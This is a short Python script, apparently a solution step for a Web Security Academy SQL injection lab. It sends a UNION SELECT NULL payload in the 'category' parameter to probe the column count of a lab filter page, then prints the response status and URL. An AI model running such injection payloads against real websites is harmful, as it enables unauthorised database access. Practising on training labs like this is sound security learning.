#!/usr/bin/env python3

import requests

url = "https://0ae700d1038db969808b21bb006e00b4.web-security-academy.net/filter"
params = {"category": "Gifts' UNION SELECT NULL, NULL, NULL--"}

response = requests.get(url, params=params)

print(response.status_code)
print(response.url)
